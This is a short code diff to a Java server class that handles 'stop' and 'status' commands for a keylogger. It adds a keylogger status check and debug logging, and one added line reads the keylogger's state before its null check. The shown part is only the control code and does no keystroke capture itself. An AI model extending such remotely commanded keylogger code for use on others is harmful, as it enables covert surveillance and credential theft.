@@ -325,7 +325,7 @@ public class HeimdallServer extends AbstractVerticle {
 		ParserResponse response= new ParserResponse();
 		
 		String command = iterator.next();
-		System.out.println("Command :-> " + command);
+		System.out.println("Command Keylog :-> " + command);
 		switch(command){
 		case "stop":   response = stopkeylog(); break;
 		
@@ -335,7 +335,7 @@ public class HeimdallServer extends AbstractVerticle {
 					   
 					 }break;
 					 
-		case "status": response = status();				break;
+		case "status": response = status_keylog();				break;
 		
 		default:{
 			response.setResult(false);
@@ -345,10 +345,19 @@ public class HeimdallServer extends AbstractVerticle {
 		}return response;
 	}
 
+	private ParserResponse status_keylog() {
+		// TODO Auto-generated method stub
+		ParserResponse response = new ParserResponse();
+		if(keylogger!=null)
+			response.setResult(keylogger.isRunning());
+		return response;
+	}
+
 	private ParserResponse stopkeylog() {
 		// TODO Auto-generated method stub
 		
 		ParserResponse response = new ParserResponse();
+		System.out.println("Keylogger running ? :"+keylogger.isRunning());
 		if(keylogger!=null)
 			if(keylogger.isRunning()){
 				keylogger.stop();
